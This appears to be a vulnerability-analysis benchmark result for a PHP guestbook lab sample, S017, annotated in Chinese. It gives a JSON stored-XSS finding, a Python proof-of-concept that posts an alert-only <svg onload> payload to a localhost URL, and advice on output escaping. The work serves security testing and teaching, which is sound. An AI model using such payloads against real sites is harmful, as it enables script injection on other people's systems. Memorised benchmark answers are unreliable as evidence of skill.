@@ -1,0 +1,62 @@
+```json
+{"sample_id":"S017","prediction":"vulnerable","vulnerability_type":"XSS","locations":["F01:0008","F01:0015","F01:0016","F01:0030","F01:0033","F01:0053"],"evidence":{"source":"F01:0008 从 $_POST['body'] 原样取得留言，仅做空值和长度检查","flow":"F01:0015-F01:0016 参数化写入 lab_guestbook.body；F01:0030-F01:0033 读取 body；F01:0053 将 body 输出到 HTML 正文","guard":"无效：F01:0053 直接 echo，无 HTML 实体编码或净化；参数化仅防 SQL 注入，不防 XSS","sink":"F01:0053 在 div 正文内直接 echo $message['body']，未转义"},"prerequisites":["S017 页面可通过 http://127.0.0.1:4280/ 对应路径访问","数据库表 lab_guestbook 可用且 POST 保存成功","使用支持 JavaScript 的浏览器打开页面观察"],"missing_context":["未提供 S017 页面具体 URL 路径；脚本默认使用 127.0.0.1:4280 根路径，需按实际 index.php 地址配置","未提供浏览器 CSP 等客户端上下文；脚本执行需人工在浏览器确认"],"poc_generated":true,"poc_language":"python3","poc_instructions":"将环境变量 S017_URL 设置为 S017 的实际 index.php 地址，默认 http://127.0.0.1:4280/。运行脚本会先 POST 普通标记 S017_NORMAL_MARKER，再 GET 页面；随后 POST 测试输入 <svg onload=alert('S017_XSS')></svg> 并 GET 页面。最后人工在浏览器打开同一 URL：普通输入应仅作为文本显示；测试输入若被执行会弹出 S017_XSS。HTTP 响应体包含 payload 字符串不等同于 JavaScript 执行。"}
+```
+
+```python
+import os
+import urllib.parse
+import urllib.request
+
+TARGET_URL = os.environ.get("S017_URL", "http://127.0.0.1:4280/")
+NORMAL_INPUT = "S017_NORMAL_MARKER"
+TEST_INPUT = "<svg onload=alert('S017_XSS')></svg>"
+
+
+def post_body(url: str, body: str):
+    data = urllib.parse.urlencode({"body": body}).encode("utf-8")
+    req = urllib.request.Request(
+        url,
+        data=data,
+        method="POST",
+        headers={"Content-Type": "application/x-www-form-urlencoded"},
+    )
+    with urllib.request.urlopen(req, timeout=10) as resp:
+        return resp.status, resp.read().decode("utf-8", "replace")
+
+
+def get_page(url: str):
+    with urllib.request.urlopen(url, timeout=10) as resp:
+        return resp.status, resp.read().decode("utf-8", "replace")
+
+
+def main():
+    print("目标 URL:", TARGET_URL)
+
+    print("\n[1] 写入普通输入:", NORMAL_INPUT)
+    status, _ = post_body(TARGET_URL, NORMAL_INPUT)
+    print("POST 普通输入状态:", status)
+
+    status, html = get_page(TARGET_URL)
+    print("GET 页面状态:", status)
+    print("响应含普通标记:", NORMAL_INPUT in html)
+    print("响应含测试 payload 字符串:", TEST_INPUT in html)
+
+    print("\n[2] 写入测试输入:", TEST_INPUT)
+    status, _ = post_body(TARGET_URL, TEST_INPUT)
+    print("POST 测试输入状态:", status)
+
+    status, html = get_page(TARGET_URL)
+    print("GET 页面状态:", status)
+    print("响应含测试 payload 字符串:", TEST_INPUT in html)
+
+    print("\n[3] 需要人工在浏览器确认：")
+    print("请打开:", TARGET_URL)
+    print("普通标记应只作为文本显示；测试输入若被浏览器执行，应弹出提示框 S017_XSS。")
+    print("注意：HTTP 响应中出现 payload 字符串不等同于 JavaScript 已执行。")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+防护建议（非已验证事实）：输出留言时使用 `htmlspecialchars($message['body'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')`，或使用默认自动转义的模板；继续保留参数化 SQL；可结合 CSP 降低 XSS 影响。
